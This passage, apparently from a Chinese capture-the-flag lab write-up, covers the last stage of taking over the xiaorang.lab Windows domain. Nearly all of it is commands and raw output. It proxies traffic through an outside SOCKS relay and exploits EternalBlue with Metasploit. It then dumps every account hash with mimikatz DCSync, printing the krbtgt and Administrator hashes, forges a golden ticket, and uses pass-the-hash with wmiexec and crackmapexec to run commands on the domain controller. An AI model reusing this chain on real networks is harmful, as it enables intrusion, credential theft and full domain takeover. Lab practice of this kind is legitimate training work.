\\ \\  \\ \\  \\\\\\  \\ \\  \\\\  \\\\ \\  \\ \\  \\ \\  \\\\ \\  \\ \\  \\|\\  \\  /  /\\   \\    \\ \\__\\ \\__\\ \\__\\ \\_______\\ \\__\\\\ _\\\\ \\__\\ \\__\\ \\__\\\\ \\__\\ \\_______\\/__/ /\\ __\\    \\|__|\\|__|\\|__|\\|_______|\\|__|\\|__|\\|__|\\|__|\\|__| \\|__|\\|_______||__|/ \\|__|                                                                      flag02: 2ce3-4813-87d4-Awesome! ! ! You found the second flag, now you can attack the domain controller.\n\nflag03kali设置一下代理，服务器nps的端口\n\nvim /etc/proxychains4.confsocks5        121.43.55.52 7777\n\n用msf打永恒之蓝\nproxychains msfconsoleuse exploit/windows/smb/ms17_010_eternalblueset payload windows/x64/meterpreter/bind_tcp_uuidset RHOSTS 172.22.1.21exploit\n\n利用DCSync\nmeterpreter &gt; load kiwi[proxychains] DLL init: proxychains-ng 4.16[proxychains] DLL init: proxychains-ng 4.16Loading extension kiwi...  .#####.   mimikatz 2.2.0 20191125 (x64/windows) .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo) ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ##       &gt; http://blog.gentilkiwi.com/mimikatz &#x27;## v ##&#x27;        Vincent LE TOUX            ( vincent.letoux@gmail.com )  &#x27;#####&#x27;         &gt; http://pingcastle.com / http://mysmartlogon.com  ***/Success.meterpreter &gt; kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv[proxychains] DLL init: proxychains-ng 4.16[proxychains] DLL init: proxychains-ng 4.16[DC] &#x27;xiaorang.lab&#x27; will be the domain[DC] &#x27;DC01.xiaorang.lab&#x27; will be the DC server[DC] Exporting domain &#x27;xiaorang.lab&#x27;[rpc] Service  : ldap[rpc] AuthnSvc : GSS_NEGOTIATE (9)502     krbtgt  fb812eea13a18b7fcdb8e6d67ddc205b        5141106    Marcus  e07510a4284b3c97c8e7dee970918c5c        5121107    Charles f6a9881cd5ae709abb4ac9ab87f24617        512500     Administrator   10cf89a850fb1cdbe6bb432b859164c8        5121000    DC01$   34b07f0e507a89afd072a38a87d9ade7        5324801104    XIAORANG-OA01$  6e044889fa255c3d36a379f86cde1c5f        40961108    XIAORANG-WIN7$  1cd853447da375a93c53bf8c03d3068e        4096# 生成黄金票据meterpreter &gt; kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /user:krbtgt[proxychains] DLL init: proxychains-ng 4.16[proxychains] DLL init: proxychains-ng 4.16[DC] &#x27;xiaorang.lab&#x27; will be the domain[DC] &#x27;DC01.xiaorang.lab&#x27; will be the DC server[DC] &#x27;krbtgt&#x27; will be the user account[rpc] Service  : ldap[rpc] AuthnSvc : GSS_NEGOTIATE (9)Object RDN           : krbtgt** SAM ACCOUNT **SAM Username         : krbtgtAccount Type         : 30000000 ( USER_OBJECT )User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )Account expiration   : Password last change : 2022/6/5 20:40:39Object Security ID   : S-1-5-21-314492864-3856862959-4045974917-502Object Relative ID   : 502Credentials:  Hash NTLM: fb812eea13a18b7fcdb8e6d67ddc205b    ntlm- 0: fb812eea13a18b7fcdb8e6d67ddc205b    lm  - 0: c4f45322c850c77aecb3aa71c2e44c1eSupplemental Credentials:* Primary:NTLM-Strong-NTOWF *    Random Value : 849f7f8ab6eb3b3a1c7c926de5ee5574* Primary:Kerberos-Newer-Keys *    Default Salt : XIAORANG.LABkrbtgt    Default Iterations : 4096    Credentials      aes256_hmac       (4096) : acbbedcabc9ad1d8638cda298e15761626e1bce7ce80eae90d95252f8162bba8      aes128_hmac       (4096) : 207ea00513bdf19042937aa38c9ad2dd      des_cbc_md5       (4096) : c70ee386138c7016* Primary:Kerberos *    Default Salt : XIAORANG.LABkrbtgt    Credentials      des_cbc_md5       : c70ee386138c7016# 导入黄金票据meterpreter &gt; kiwi_cmd kerberos::golden /user:administrator /domain:xiaorang.lab /sid:S-1-5-21-314492864-3856862959-4045974917-502 /krbtgt:fb812eea13a18b7fcdb8e6d67ddc205b /ptt[proxychains] DLL init: proxychains-ng 4.16[proxychains] DLL init: proxychains-ng 4.16User      : administratorDomain    : xiaorang.lab (XIAORANG)SID       : S-1-5-21-314492864-3856862959-4045974917-502User Id   : 500Groups Id : *513 512 520 518 519 ServiceKey: fb812eea13a18b7fcdb8e6d67ddc205b - rc4_hmac_nt      Lifetime  : 2023/10/22 15:33:33 ; 2033/10/19 15:33:33 ; 2033/10/19 15:33:33-&gt; Ticket : ** Pass The Ticket ** * PAC generated * PAC signed * EncTicketPart generated * EncTicketPart encrypted * KrbCred generatedGolden ticket for &#x27;administrator @ xiaorang.lab&#x27; successfully submitted for current session# wmiexec哈希传递# msf转shell半天转不过来，换个方式# msf转shell后的利用方式：wmiexec.exe -hashes :10cf89a850fb1cdbe6bb432b859164c8 xiaorang/administrator@172.22.1.2 &quot;type Users\\Administrator\\flag\\flag03.txt&quot;⚡ root@kali  ~  proxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x &quot;type Users\\Administrator\\flag\\flag03.txt&quot;[proxychains] config file found: /etc/proxychains4.conf[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4[proxychains] DLL init: proxychains-ng 4.16[*] First time use detected[*] Creating home directory structure[*] Creating default workspace[*] Initializing FTP protocol database[*] Initializing MSSQL protocol database[*] Initializing RDP protocol database[*] Initializing WINRM protocol database[*] Initializing LDAP protocol database[*] Initializing SSH protocol database[*] Initializing SMB protocol database[*] Copying default configuration file[*] Generating SSL certificate[proxychains] DLL init: proxychains-ng 4.16[proxychains] Strict chain  ...  121.43.55.52:7777  ...  172.22.1.2:445  ...  OK[proxychains] Strict chain  ...  121.43.55.52:7777  ...  172.22.1.2:135  ...  OKSMB         172.22.1.2      445    DC01             [*] Windows Server 2016 Datacenter 14393 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:True)[proxychains] Strict chain  ...  121.43.55.52:7777  ...  172.22.1.2:445  ...  OKSMB         172.22.1.2      445    DC01             [+] xiaorang.lab\\administrator:10cf89a850fb1cdbe6bb432b859164c8 (Pwn3d!)[proxychains] Strict chain  ...  121.43.55.52:7777  ...  172.22.1.2:135  ...  OK[proxychains] Strict chain  ...  121.43.55.52:7777  ...  172.22.1.2:49668  ...  OKSMB         172.22.1.2      445    DC01             [+] Executed command SMB         172.22.1.2      445    DC01             ___   ___SMB         172.22.1.2      445    DC01             \\\\ / /       / /    // | |     //   ) ) //   ) )  // | |     /|    / / //   ) )SMB         172.22.1.2      445    DC01             \\  /       / /    //__| |    //   / / //___/ /  //__| |    //|   / / //SMB         172.22.1.2      445    DC01             / /       / /    / ___  |   //   / / / ___ (   / ___  |   // |  / / //  ____SMB         172.22.1.2      445    DC01             / /\\\\     / /    //    | |  //   / / //   | |  //    | |  //  | / / //    / /SMB         172.22.1.2      445    DC01             / /  \\\\ __/ /___ //     | | ((___/ / //    | | //     | | //   |/ / ((____/ /SMB         172.22.1.2      445    DC01             SMB         172.22.1.2      445    DC01             SMB         172.22.1.2      445    DC01             flag03: e8f88d0d43d6&#125;SMB         172.22.1.2      445    DC01             SMB         172.22.1.2      445    DC01             Unbelievable! ! You found the last flag, which means you have full control over the entire domain network.\n\nflagflag{60b53231-2ce3-4813-87d4-e8f88d0d43d6}\n","categories":["渗透测试"],"tags":["渗透","春秋云镜"]}]